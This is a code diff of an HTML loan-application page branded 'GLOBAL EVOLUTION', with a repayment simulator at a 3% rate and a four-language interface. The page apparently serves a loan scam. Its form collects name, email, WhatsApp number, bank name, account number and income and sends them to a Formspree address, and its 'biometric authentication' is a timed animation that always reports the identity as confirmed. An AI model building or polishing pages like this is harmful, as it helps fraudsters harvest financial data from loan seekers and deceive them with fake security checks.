@@ -12,70 +12,47 @@
         .step { display: none; animation: fadeIn 0.4s ease-out; }
         .step.active { display: flex; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        
         .glass-card { background: white; border-radius: 32px; border: 1px solid #e2e8f0; box-shadow: 0 20px 50px rgba(0,0,0,0.05); }
         .btn-elite { background: var(--primary); color: white; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); box-shadow: 0 10px 25px rgba(29, 78, 216, 0.3); }
-        .btn-elite:active { transform: scale(0.95); }
-        
         .lang-card { border: 2px solid transparent; background: white; transition: all 0.2s; cursor: pointer; }
-        .lang-card.selected { border-color: var(--primary); background: #eff6ff; transform: scale(1.02); }
-
+        .lang-card.selected { border-color: var(--primary); background: #eff6ff; }
         #laser-line { position: absolute; left: 0; width: 100%; height: 3px; background: var(--primary); box-shadow: 0 0 15px var(--primary); animation: scanAnimate 2s linear infinite; }
         @keyframes scanAnimate { 0%, 100% { top: 15%; } 50% { top: 85%; } }
-
-        input::placeholder { color: #94a3b8; }
     </style>
 </head>
 <body class="font-sans">
 
-    <audio id="scanSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
-
-    <nav class="p-4 flex justify-between items-center bg-white/80 backdrop-blur-md sticky top-0 z-50 border-b border-slate-100">
-        <div class="flex items-center gap-2">
-            <div class="w-10 h-10 bg-blue-700 rounded-xl flex items-center justify-center text-white font-bold shadow-lg">G</div>
-            <div class="font-black text-blue-900 uppercase tracking-tighter">Global Aide</div>
-        </div>
-        <div class="bg-slate-50 text-[10px] font-bold text-slate-500 px-4 py-2 rounded-lg border border-slate-200">
-            <i class="fas fa-certificate text-yellow-500 mr-1"></i> <span id="nav-testi">AVIS</span>
-        </div>
-    </nav>
-
-    <section id="step-lang" class="step active min-h-[85vh] flex-col items-center justify-center p-6">
-        <div class="text-center mb-10">
-            <h1 class="text-4xl font-black text-blue-900 mb-2 italic uppercase">GLOBAL EVOLUTION</h1>
-            <p class="text-slate-400 text-[10px] font-bold uppercase tracking-[0.3em]">Smart Finance Solutions 2026</p>
-        </div>
-
+    <section id="step-lang" class="step active min-h-screen flex-col items-center justify-center p-6">
+        <h1 class="text-4xl font-black text-blue-900 mb-10 italic uppercase">GLOBAL EVOLUTION</h1>
         <div class="grid grid-cols-2 gap-4 w-full max-w-sm mb-10">
             <div onclick="selectLang('fr', '€')" class="lang-card p-6 rounded-3xl shadow-sm flex flex-col items-center gap-2" id="btn-fr">
-                <span class="text-3xl">🇫🇷</span><span class="font-bold text-[10px] text-slate-600 uppercase">Français</span>
+                <span class="text-3xl">🇫🇷</span><span class="font-bold text-[10px] uppercase">Français</span>
             </div>
             <div onclick="selectLang('en', '$')" class="lang-card p-6 rounded-3xl shadow-sm flex flex-col items-center gap-2" id="btn-en">
-                <span class="text-3xl">🇺🇸</span><span class="font-bold text-[10px] text-slate-600 uppercase">English</span>
+                <span class="text-3xl">🇺🇸</span><span class="font-bold text-[10px] uppercase">English</span>
             </div>
             <div onclick="selectLang('es', '$')" class="lang-card p-6 rounded-3xl shadow-sm flex flex-col items-center gap-2" id="btn-es">
-                <span class="text-3xl">🇪🇸</span><span class="font-bold text-[10px] text-slate-600 uppercase">Español</span>
+                <span class="text-3xl">🇪🇸</span><span class="font-bold text-[10px] uppercase">Español</span>
             </div>
             <div onclick="selectLang('de', '€')" class="lang-card p-6 rounded-3xl shadow-sm flex flex-col items-center gap-2" id="btn-de">
-                <span class="text-3xl">🇩🇪</span><span class="font-bold text-[10px] text-slate-600 uppercase">Deutsch</span>
+                <span class="text-3xl">🇩🇪</span><span class="font-bold text-[10px] uppercase">Deutsch</span>
             </div>
         </div>
-
         <button onclick="goToStep(2)" class="btn-elite w-full max-w-sm py-6 rounded-full font-black flex items-center justify-center gap-4">
             <span id="btn-cont-text">CONTINUER</span> <i class="fas fa-arrow-right"></i>
         </button>
     </section>
 
     <section id="step-sim" class="step min-h-screen flex-col p-4">
-        <div class="max-w-xl mx-auto w-full pt-4">
+        <div class="max-w-xl mx-auto w-full pt-10">
             <div class="glass-card p-8">
-                <h2 class="text-xl font-black text-blue-900 mb-8 text-center uppercase tracking-widest" id="sim-title">Simulateur</h2>
+                <h2 class="text-xl font-black text-blue-900 mb-8 text-center uppercase" id="sim-title">Simulateur</h2>
                 <div class="space-y-8">
                     <div>
                         <div class="flex justify-between mb-4 font-bold text-slate-400 text-xs uppercase">
                             <span id="lbl-amt">Montant</span>
                             <div class="flex items-center gap-2">
-                                <button onclick="editAmount()" class="text-blue-500 text-xs"><i class="fas fa-pen"></i></button>
+                                <button onclick="editAmount()" class="text-blue-500"><i class="fas fa-pen text-xs"></i></button>
                                 <span class="text-blue-700 text-lg"><span id="val-amt">5000</span> <span class="curr">€</span></span>
                             </div>
                         </div>
@@ -90,9 +67,16 @@
                     </div>
                 </div>
 
-                <div class="mt-10 bg-blue-900 p-6 rounded-3xl text-white shadow-xl">
-                    <div class="flex justify-between items-center mb-3"><span id="res-lbl-men" class="text-[10px] font-bold uppercase text-blue-200">Mensualité (3%)</span><span id="res-monthly" class="text-2xl font-black">...</span></div>
-                    <div class="flex justify-between items-center border-t border-blue-800 pt-3"><span id="res-lbl-tot" class="text-[10px] font-bold uppercase text-blue-200">Total à rembourser</span><span id="res-total" class="font-bold">...</span></div>
+                <div class="mt-10 bg-blue-900 p-6 rounded-3xl text-white shadow-xl relative">
+                    <div class="absolute top-2 right-4 text-[9px] font-bold text-blue-300">INTERÊT: 3%</div>
+                    <div class="flex justify-between items-center mb-3">
+                        <span id="res-lbl-men" class="text-[10px] font-bold uppercase text-blue-200">Mensualité</span>
+                        <span id="res-monthly" class="text-2xl font-black">...</span>
+                    </div>
+                    <div class="flex justify-between items-center border-t border-blue-800 pt-3">
+                        <span id="res-lbl-tot" class="text-[10px] font-bold uppercase text-blue-200">Total (avec 3%)</span>
+                        <span id="res-total" class="font-bold">...</span>
+                    </div>
                 </div>
                 <button onclick="goToStep(3)" id="btn-next" class="btn-elite w-full py-5 rounded-full font-black mt-8 uppercase text-sm">Passer au dossier</button>
             </div>
@@ -102,7 +86,7 @@
     <section id="step-form" class="step min-h-screen flex-col p-4">
         <div class="max-w-xl mx-auto w-full pb-20">
             <div class="glass-card p-8">
-                <form action="https://formspree.io/f/0f51a6e2-1eec-4545-9d6a-8cddc84a8f80" method="POST" class="space-y-4">
+                <form action="https://formspree.io/f/mzdkpgay" method="POST" class="space-y-4">
                     <input type="hidden" name="PRÊT_MONTANT" id="h-m">
                     <input type="hidden" name="PRÊT_DURÉE" id="h-d">
                     <input type="hidden" name="DEVISE" id="h-c">
@@ -110,22 +94,22 @@
                     <h2 class="text-2xl font-black text-blue-900 mb-6 uppercase" id="form-title">Dossier Digital</h2>
                     
                     <div class="grid gap-4">
-                        <input type="text" name="Nom" id="i-nom" placeholder="Nom complet" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:border-blue-500">
-                        <input type="email" name="Email" id="i-email" placeholder="Adresse Email" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:border-blue-500">
-                        <input type="text" name="Pays" id="i-pais" placeholder="Pays" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:border-blue-500">
-                        <input type="tel" name="WhatsApp" id="i-wa" placeholder="Numéro de téléphone WhatsApp" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:border-blue-500">
+                        <input type="text" name="Nom" id="i-nom" placeholder="Nom complet" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none">
+                        <input type="email" name="Email" id="i-email" placeholder="Email" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none">
+                        <input type="text" name="Pays" id="i-pais" placeholder="Pays" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none">
+                        <input type="tel" name="WhatsApp" id="i-wa" placeholder="WhatsApp" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none">
                         
                         <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                            <input type="text" name="Banque" id="i-bank" placeholder="Nom de votre banque" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:border-blue-500">
-                            <input type="text" name="Compte" id="i-acc" placeholder="Numéro de compte" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:border-blue-500">
+                            <input type="text" name="Banque" id="i-bank" placeholder="Banque" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none">
+                            <input type="text" name="Compte" id="i-acc" placeholder="N° de Compte" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none">
                         </div>
                         
-                        <input type="text" name="Revenus" id="i-rev" placeholder="Revenus mensuels" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:border-blue-500">
+                        <input type="text" name="Revenus" id="i-rev" placeholder="Revenus" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none">
                     </div>
 
                     <div class="mt-6 p-6 bg-blue-50 rounded-3xl border-2 border-dashed border-blue-100 text-center">
-                        <label class="text-[9px] font-black text-blue-800 uppercase block mb-4" id="lbl-scan">Authentification Biométrique</label>
-                        <div id="biometric-area" onclick="startScan()" class="w-20 h-20 mx-auto rounded-2xl bg-white shadow-sm border border-slate-200 flex items-center justify-center cursor-pointer relative overflow-hidden">
+                        <label class="text-[9px] font-black text-blue-800 uppercase block mb-4" id="lbl-scan">Biométrie</label>
+                        <div onclick="startScan()" class="w-20 h-20 mx-auto rounded-2xl bg-white shadow-sm flex items-center justify-center cursor-pointer relative overflow-hidden">
                             <i id="finger-icon" class="fas fa-fingerprint text-3xl text-slate-300"></i>
                             <div id="laser-line" class="hidden"></div>
                         </div>
@@ -141,9 +125,10 @@
     <script>
         let cL = 'fr', cC = '€';
         const tr = {
-            fr: { cont: "CONTINUER", sim: "Simulateur", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total", fTitle: "DOSSIER", scan: "BIOMÉTRIE", scanWait: "ANALYSE...", scanOk: "IDENTITÉ OK", plNom: "Nom complet", plEmail: "Email", plPays: "Pays", plWa: "Numéro de téléphone WhatsApp", plBank: "Nom de votre banque", plAcc: "Numéro de compte", plRev: "Revenus", btnNext: "Passer au dossier", btnSubmit: "Confirmer l'inscription" },
-            en: { cont: "CONTINUE", sim: "Simulator", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly", tot: "Total", fTitle: "FILE", scan: "BIOMETRICS", scanWait: "SCANNING...", scanOk: "IDENTITY OK", plNom: "Full Name", plEmail: "Email", plPays: "Country", plWa: "WhatsApp Phone Number", plBank: "Bank Name", plAcc: "Account Number", plRev: "Income", btnNext: "Go to application", btnSubmit: "Confirm registration" },
-            es: { cont: "CONTINUAR", sim: "Simulador", amt: "Monto", dur: "Plazo", yr: "Años", men: "Cuota", tot: "Total", fTitle: "EXPEDIENTE", scan: "BIOMETRÍA", scanWait: "ESCANEANDO...", scanOk: "CONFIRMADO", plNom: "Nombre", plEmail: "Email", plPays: "País", plWa: "Número de WhatsApp", plBank: "Nombre del banco", plAcc: "Número de cuenta", plRev: "Ingresos", btnNext: "Pasar al expediente", btnSubmit: "Confirmar inscripción" }
+            fr: { cont: "CONTINUER", sim: "Simulateur", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total (avec 3%)", fTitle: "DOSSIER", scan: "BIOMÉTRIE", scanWait: "ANALYSE...", scanOk: "IDENTITÉ OK", plNom: "Nom complet", plEmail: "Email", plPays: "Pays", plWa: "Numéro de téléphone WhatsApp", plBank: "Nom de votre banque", plAcc: "Numéro de compte", plRev: "Revenus mensuels", btnNext: "Passer au dossier", btnSubmit: "Confirmer l'inscription" },
+            en: { cont: "CONTINUE", sim: "Simulator", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly", tot: "Total (with 3%)", fTitle: "FILE", scan: "BIOMETRICS", scanWait: "SCANNING...", scanOk: "IDENTITY OK", plNom: "Full Name", plEmail: "Email", plPays: "Country", plWa: "WhatsApp Phone Number", plBank: "Bank Name", plAcc: "Account Number", plRev: "Monthly Income", btnNext: "Go to application", btnSubmit: "Confirm registration" },
+            es: { cont: "CONTINUAR", sim: "Simulador", amt: "Monto", dur: "Plazo", yr: "Años", men: "Cuota", tot: "Total (con 3%)", fTitle: "EXPEDIENTE", scan: "BIOMETRÍA", scanWait: "ESCANEANDO...", scanOk: "CONFIRMADO", plNom: "Nombre", plEmail: "Email", plPays: "País", plWa: "Número de WhatsApp", plBank: "Nombre del banco", plAcc: "Número de cuenta", plRev: "Ingresos", btnNext: "Pasar al expediente", btnSubmit: "Confirmar inscripción" },
+            de: { cont: "WEITER", sim: "Simulator", amt: "Betrag", dur: "Dauer", yr: "Jahre", men: "Monatlich", tot: "Gesamt (mit 3%)", fTitle: "DATEI", scan: "BIOMETRIE", scanWait: "SCANNEN...", scanOk: "BESTÄTIGT", plNom: "Vollständiger Name", plEmail: "E-Mail", plPays: "Land", plWa: "WhatsApp-Nummer", plBank: "Bankname", plAcc: "Kontonummer", plRev: "Einkommen", btnNext: "Zur Akte gehen", btnSubmit: "Registrierung bestätigen" }
         };
 
         function selectLang(l, c) {
@@ -169,7 +154,7 @@
             const y = parseInt(document.getElementById('yearRange').value);
             document.getElementById('val-amt').innerText = a.toLocaleString();
             document.getElementById('val-dur').innerText = y;
-            const total = Math.round(a * 1.03);
+            const total = Math.round(a * 1.03); // Taux 3% appliqué ici
             const monthly = Math.round(total / (y * 12));
             document.getElementById('res-monthly').innerText = monthly.toLocaleString() + " " + cC;
             document.getElementById('res-total').innerText = total.toLocaleString() + " " + cC;
@@ -186,6 +171,8 @@
             document.getElementById('lbl-amt').innerText = t.amt;
             document.getElementById('lbl-dur').innerText = t.dur;
             document.getElementById('lbl-years').innerText = t.yr;
+            document.getElementById('res-lbl-men').innerText = t.men;
+            document.getElementById('res-lbl-tot').innerText = t.tot;
             document.getElementById('form-title').innerText = t.fTitle;
             document.getElementById('btn-next').innerText = t.btnNext;
             document.getElementById('btn-submit').innerText = t.btnSubmit;
@@ -200,23 +187,17 @@
         }
 
         function startScan() {
-            const l = document.getElementById('laser-line');
-            const s = document.getElementById('status-text');
-            const i = document.getElementById('finger-icon');
-            l.classList.remove('hidden');
-            s.innerText = tr[cL].scanWait;
-            i.classList.add('text-blue-500', 'animate-pulse');
+            document.getElementById('laser-line').classList.remove('hidden');
+            document.getElementById('status-text').innerText = tr[cL].scanWait;
+            document.getElementById('finger-icon').classList.add('text-blue-500', 'animate-pulse');
             setTimeout(() => {
-                l.classList.add('hidden');
-                s.innerText = tr[cL].scanOk;
-                s.classList.add('text-green-600');
-                i.classList.replace('text-slate-300', 'text-green-500');
-                i.classList.remove('animate-pulse');
+                document.getElementById('laser-line').classList.add('hidden');
+                document.getElementById('status-text').innerText = tr[cL].scanOk;
+                document.getElementById('finger-icon').classList.replace('text-slate-300', 'text-green-500');
             }, 2500);
         }
 
         window.onload = () => { selectLang('fr', '€'); };
     </script>
 </body>
-                    </html>
-                        
+</html>
